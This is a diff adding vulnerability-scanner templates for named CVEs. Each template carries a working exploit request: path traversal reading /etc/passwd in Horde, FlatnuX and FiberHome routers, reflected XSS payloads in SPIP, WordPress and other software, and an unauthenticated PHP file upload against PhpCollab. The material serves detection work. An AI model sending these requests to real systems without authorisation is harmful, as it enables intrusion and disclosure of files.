@@ -221,6 +221,40 @@
       ]
     },
     {
+      "id": "CVE-2009-0932",
+      "info": {
+        "author": "pikpikcu",
+        "description": "Directory traversal vulnerability in framework/Image/Image.php in Horde before 3.2.4 and 3.3.3 and Horde Groupware before 1.1.5 allows remote attackers to include and execute arbitrary local files via directory traversal sequences in the Horde_Image driver name.\n",
+        "name": "Horde - Horde_Image::factory driver Argument LFI",
+        "reference": "- https://www.exploit-db.com/exploits/16154\n- https://nvd.nist.gov/vuln/detail/CVE-2009-0932?cpeVersion=2.2\n",
+        "severity": "high",
+        "tags": "cve,cve2009,horde,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/horde/util/barcode.php?type=../../../../../../../../../../../etc/./passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2009-1151",
       "info": {
         "author": "princechaddha",
@@ -1290,6 +1324,40 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/?dlsearch=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2012-4878",
+      "info": {
+        "author": "daffainfo",
+        "description": "Path traversal vulnerability in controlcenter.php in FlatnuX CMS 2011 08.09.2 allows remote administrators to read arbitrary files via a full pathname in the dir parameter in a contents/Files action.",
+        "name": "FlatnuX CMS - Directory Traversal",
+        "reference": "- https://www.exploit-db.com/exploits/37034\n- https://www.cvedetails.com/cve/CVE-2012-4878\n",
+        "severity": "high",
+        "tags": "cve,cve2012,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/controlcenter.php?opt=contents/Files&dir=%2Fetc&ffile=passwd&opmod=open"
           ]
         }
       ]
@@ -3634,6 +3702,48 @@
       ]
     },
     {
+      "id": "CVE-2016-7981",
+      "info": {
+        "author": "pikpikcu",
+        "description": "Cross-site scripting (XSS) vulnerability in valider_xml.php in SPIP 3.1.2 and earlier allows remote attackers to inject arbitrary web script or HTML via the var_url parameter in a valider_xml action.\n",
+        "name": "SPIP 3.1.2 XSS",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-7981",
+        "severity": "medium",
+        "tags": "cve,cve2016,xss,spip"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "\"></script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/ecrire/?exec=valider_xml&var_url=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2017-1000028",
       "info": {
         "author": "pikpikcu",
@@ -4244,6 +4354,40 @@
       ]
     },
     {
+      "id": "CVE-2017-15647",
+      "info": {
+        "author": "daffainfo",
+        "description": "On FiberHome routers, Directory Traversal exists in /cgi-bin/webproc via the getpage parameter in conjunction with a crafted var:page value.",
+        "name": "FiberHome - Directory Traversal",
+        "reference": "- https://www.exploit-db.com/exploits/44054\n- https://www.cvedetails.com/cve/CVE-2017-15647\n",
+        "severity": "medium",
+        "tags": "cve,cve2017,lfi,router"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cgi-bin/webproc?getpage=/etc/passwd&var:language=en_us&var:page=wizardfifth"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2017-15715",
       "info": {
         "author": "geeknik",
@@ -4847,6 +4991,40 @@
           ],
           "raw": [
             "GET / HTTP/1.1\nHost: {{Hostname}}\nAccept-Charset: iso-8859-1,utf-8;q=0.9,*;q=0.1\nAccept-Language: en\nContent-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Hacker','Bounty Plz')}.multipart/form-data\nConnection: Keep-Alive\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\nPragma: no-cache\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2017-6090",
+      "info": {
+        "author": "pikpikcu",
+        "name": "PhpCollab (unauthenticated) Arbitrary File Upload",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-6090",
+        "severity": "critical",
+        "tags": "cve,cve2017,phpcollab,rce,fileupload"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "48dbd2384cb6b996fa1e2855c7f0567f"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /clients/editclient.php?id={{randstr}}&action=update HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=---------------------------154934846911423734231554128137\n\n-----------------------------154934846911423734231554128137\nContent-Disposition: form-data; name=\"upload\"; filename=\"{{randstr}}.php\"\nContent-Type: application/x-php\n\n<?php echo md5('phpcollab_rce');?>\n\n-----------------------------154934846911423734231554128137--\n",
+            "GET /logos_clients/1.php HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -13720,6 +13898,48 @@
       ]
     },
     {
+      "id": "CVE-2020-26153",
+      "info": {
+        "author": "pikpikcu",
+        "description": "cross-site scripting (XSS) vulnerability in wp-content/plugins/event-espresso-core-reg/admin_pages/messages/templates/ee_msg_admin_overview.template.php in the Event Espresso Core plugin before 4.10.7.p for WordPress allows remote attackers to inject arbitrary web script or HTML via the page parameter.\n",
+        "name": "Event Espresso Core-Reg XSS",
+        "reference": "- https://labs.nettitude.com/blog/cve-2020-26153-event-espresso-core-cross-site-scripting/\n- https://nvd.nist.gov/vuln/detail/CVE-2020-26153\n",
+        "severity": "medium",
+        "tags": "cve,cve2020,xss,wordpress,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "\"/></script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "status": [
+                500
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/event-espresso-core-reg/admin_pages/messages/templates/ee_msg_admin_overview.template.php?page=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cb"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-26214",
       "info": {
         "author": "CasperGN",
@@ -13837,6 +14057,48 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://notburpcollaborator.net"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-27735",
+      "info": {
+        "author": "pikpikcu",
+        "description": "An XSS issue was discovered in Wing FTP 6.4.4. An arbitrary IFRAME element can be included in the help pages via a crafted link, leading to the execution of (sandboxed) arbitrary HTML and JavaScript in the user's browser.\n",
+        "name": "Wing FTP's Web Interface XSS",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-27735",
+        "severity": "medium",
+        "tags": "cve,cve2020,xss,wing-ftp"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<frame name=\"hmcontent\" src=\"javascript:alert(document.domain)\" title=\"Content frame\">"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/help/english/index.html?javascript&#58;alert(document.domain)"
           ]
         }
       ]
@@ -14482,6 +14744,48 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/downloads/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-35774",
+      "info": {
+        "author": "pikpikcu",
+        "description": "server/handler/HistogramQueryHandler.scala in Twitter TwitterServer (aka twitter-server) before 20.12.0, in some configurations, allows XSS via the /histograms endpoint.\n",
+        "name": "Twitter Server XSS",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-35774",
+        "severity": "medium",
+        "tags": "cve,cve2020,xss,twitter-server"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/admin/histograms?h=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&fmt=plot_cdf&log_scale=true"
           ]
         }
       ]
@@ -15149,6 +15453,48 @@
             "POST /tmui/locallb/workspace/fileSave.jsp HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n\nfileName=%2Ftmp%2Fnonexistent&content=echo%20%27aDNsbDBfdzBSbGQK%27%20%7C%20base64%20-d\n",
             "POST /tmui/locallb/workspace/tmshCmd.jsp HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n\ncommand=list%20%2Ftmp%2Fnonexistent\n",
             "POST /tmui/locallb/workspace/tmshCmd.jsp HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n\ncommand=delete%20cli%20alias%20private%20list\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE 2020-6171",
+      "info": {
+        "author": "pikpikcu",
+        "description": "A cross-site scripting (XSS) vulnerability in the index page of the CLink Office 2.0 management console allows remote attackers to inject arbitrary web script or HTML via the lang parameter.\n",
+        "name": "CLink Office v2 XSS",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-6171",
+        "severity": "medium",
+        "tags": "cve,cve2020,xss,clink-office"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "\"></script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1"
           ]
         }
       ]
@@ -15945,6 +16291,47 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/XmlPeek.aspx?dt=\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\win.ini&x=/validate.ashx?requri"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-9036",
+      "info": {
+        "author": "pikpikcu",
+        "name": "Jeedom through 4.0.38 allows XSS",
+        "reference": "- https://sysdream.com/news/lab/2020-08-05-cve-2020-9036-jeedom-xss-leading-to-remote-code-execution/\n- https://nvd.nist.gov/vuln/detail/CVE-2020-9036\n",
+        "severity": "medium",
+        "tags": "cve,cve2020,xss,jeedom"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>document.title = \"\";alert(document.domain);\" - Jeedom\"</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?v=d&p=%22;alert(document.domain);%22"
           ]
         }
       ]
